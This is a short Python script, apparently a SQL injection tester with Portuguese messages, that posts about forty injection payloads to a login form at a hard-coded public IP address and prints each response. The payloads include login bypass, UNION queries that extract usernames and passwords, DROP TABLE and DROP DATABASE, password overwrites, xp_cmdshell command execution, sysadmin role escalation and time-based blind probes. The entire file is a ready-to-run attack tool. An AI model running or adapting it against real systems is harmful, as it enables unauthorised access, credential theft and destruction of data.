import requests

TARGET_URL = 'http://18.229.255.99/login'

sql_injection_payloads = [
    "' OR '1'='1'; --",  
    "' OR '1'='1' AND '1'='1'; --",  
    "' OR ''=''; --",  
    "' OR 'x'='x'; --",  
    "' OR 1=1; --",  
    "' OR 1=1 LIMIT 1; --",  
    "' OR 'admin'='admin'; --",  
    "' UNION SELECT NULL, NULL, NULL; --",  
    "' UNION SELECT NULL, username, password FROM users; --",  
    "'; DROP TABLE users; --",  
    "'; DROP DATABASE test_db; --",  
    "'; UPDATE users SET password='hacked'; --",  
    "'; INSERT INTO users (username, password) VALUES ('admin', 'password'); --",  
    "' OR EXISTS (SELECT * FROM users WHERE username='admin'); --",  
    "' UNION SELECT username, password FROM users WHERE 'a'='a'; --",  
    "' AND 1=1; --",  
    "' AND 'a'='a'; --",  
    "' AND 'x'='x'; --",  
    "' AND username='admin'; --",  
    "' UNION SELECT 1, @@version; --",  
    "' UNION SELECT 1, user(); --",  
    "' UNION SELECT table_name FROM information_schema.tables; --",  
    "' OR 1=1--",  
    "' OR 'x'='x'--",  
    "' OR 1=1#",
    "' OR 'x'='x'#",
    "' UNION SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL; --",
    "' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables; --",
    "'; EXEC xp_cmdshell('dir'); --",
    "'; EXEC xp_cmdshell('net user'); --",
    "'; EXEC sp_addsrvrolemember 'sa', 'sysadmin'; --",
    "'; EXEC xp_regread('HKEY_LOCAL_MACHINE', 'SYSTEM', 'CurrentControlSet'); --",
    "' AND SLEEP(5); --",
    "' AND 1=1 AND SLEEP(5); --",
    "' OR 1=1 AND SLEEP(5); --",
    "' OR 1=0 AND SLEEP(5); --",
    "' AND 'a'='a' WAITFOR DELAY '0:0:5'; --",
    "' OR 1=1 WAITFOR DELAY '0:0:5'; --",
    "' UNION SELECT version(), user(); --",
    "' AND (SELECT COUNT(*) FROM users) > 0; --"
]

def simulate_sql_injection():
    for payload in sql_injection_payloads:
        data = {
            'username': payload,
            'password': 'password'  
        }

        try:
            print(f"Enviando payload: {payload}")
            response = requests.post(TARGET_URL, data=data)
            print(f"Status: {response.status_code}")
            print(f"Resposta: {response.text[:200]}")
        except Exception as e:
            print(f"Erro ao enviar requisição: {e}")

if __name__ == "__main__":
    simulate_sql_injection()
